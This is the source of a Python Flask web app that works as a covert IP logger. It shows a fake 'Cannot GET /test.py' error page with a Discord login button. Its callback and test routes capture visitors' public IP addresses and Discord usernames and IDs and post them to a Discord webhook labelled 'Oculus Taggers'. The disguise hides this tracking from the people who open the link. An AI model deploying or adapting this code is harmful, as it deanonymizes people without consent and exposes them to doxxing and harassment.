import os
import json
import urllib.request
import urllib.parse
from flask import Flask, request, redirect

app = Flask(__name__)

# Vercel Environment Variables
WEBHOOK_URL = os.environ.get("ATTESTATION_WEBHOOK_URL")
DISCORD_CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.environ.get("DISCORD_REDIRECT_URI")


def get_public_ip():
    forwarded_for = request.headers.get("X-Forwarded-For")

    if forwarded_for:
        return forwarded_for.split(",")[0].strip()

    return "Unknown"


def send_webhook(public_ip, discord_user=None):
    if not WEBHOOK_URL:
        print("ERROR: ATTESTATION_WEBHOOK_URL is not set")
        return False

    fields = [
        {
            "name": "Public IP Address",
            "value": f"`{public_ip}`",
            "inline": False
        }
    ]

    if discord_user:
        username = discord_user.get("username", "Unknown")
        user_id = discord_user.get("id", "Unknown")

        fields.append({
            "name": "Discord Username",
            "value": f"`{username}`",
            "inline": False
        })

        fields.append({
            "name": "Discord User ID",
            "value": f"`{user_id}`",
            "inline": False
        })

    payload = {
        "username": "Oculus Taggers",
        "embeds": [
            {
                "title": "Link Opened",
                "description": "Someone opened the Oculus Taggers link.",
                "fields": fields,
                "footer": {
                    "text": "Oculus Taggers"
                }
            }
        ]
    }

    data = json.dumps(payload).encode("utf-8")

    req = urllib.request.Request(
        WEBHOOK_URL,
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "OculusTaggers/1.0"
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            print("Discord webhook response:", response.status)
            return 200 <= response.status < 300

    except Exception as error:
        print("Discord webhook error:", str(error))
        return False


def exchange_code(code):
    data = urllib.parse.urlencode({
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": DISCORD_REDIRECT_URI
    }).encode("utf-8")

    req = urllib.request.Request(
        "https://discord.com/api/oauth2/token",
        data=data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read().decode("utf-8"))

    except Exception as error:
        print("Discord token error:", str(error))
        return None


def get_discord_user(access_token):
    req = urllib.request.Request(
        "https://discord.com/api/users/@me",
        headers={
            "Authorization": f"Bearer {access_token}",
            "User-Agent": "OculusTaggers/1.0"
        },
        method="GET"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read().decode("utf-8"))

    except Exception as error:
        print("Discord user error:", str(error))
        return None


@app.route("/")
def home():
    public_ip = get_public_ip()

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cannot GET /test.py</title>

        <style>
            html, body {
                margin: 0;
                padding: 0;
                width: 100%;
                height: 100%;
                overflow: hidden;
            }

            body {
                background: #000000;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-direction: column;
                font-family: Arial, sans-serif;
            }

            .message {
                color: white;
                font-size: 32px;
                font-weight: bold;
                margin-bottom: 25px;
            }

            .login {
                color: white;
                background: #5865F2;
                padding: 12px 24px;
                border-radius: 6px;
                text-decoration: none;
                font-size: 16px;
                font-weight: bold;
            }

            .login:hover {
                opacity: 0.9;
            }
        </style>
    </head>

    <body>
        <div class="message">Cannot GET /test.py</div>

        <a class="login" href="/login">
            Login with Discord
        </a>
    </body>
    </html>
    """


@app.route("/login")
def login():
    params = urllib.parse.urlencode({
        "client_id": DISCORD_CLIENT_ID,
        "redirect_uri": DISCORD_REDIRECT_URI,
        "response_type": "code",
        "scope": "identify"
    })

    return redirect(
        "https://discord.com/oauth2/authorize?" + params
    )


@app.route("/callback")
def callback():
    code = request.args.get("code")

    if not code:
        return "Discord authorization was cancelled.", 400

    token_data = exchange_code(code)

    if not token_data:
        return "Failed to authenticate with Discord.", 500

    access_token = token_data.get("access_token")

    if not access_token:
        return "Discord did not return an access token.", 500

    discord_user = get_discord_user(access_token)

    if not discord_user:
        return "Failed to retrieve Discord account.", 500

    public_ip = get_public_ip()

    send_webhook(
        public_ip,
        discord_user
    )

    username = discord_user.get("username", "Unknown")

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cannot GET /test.py</title>
        <style>
            html, body {{
                margin: 0;
                padding: 0;
                width: 100%;
                height: 100%;
            }}

            body {{
                background: #000000;
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: Arial, sans-serif;
                text-align: center;
            }}
        </style>
    </head>

    <body>
        <div>
            <h2>Cannot GET /test.py</h2>
            <p>Logged in as {username}</p>
        </div>
    </body>
    </html>
    """


@app.route("/api/test")
def test():
    public_ip = get_public_ip()

    success = send_webhook(public_ip)

    return {
        "ok": success,
        "public_ip": public_ip,
        "message": "Webhook sent" if success else "Webhook failed"
    }
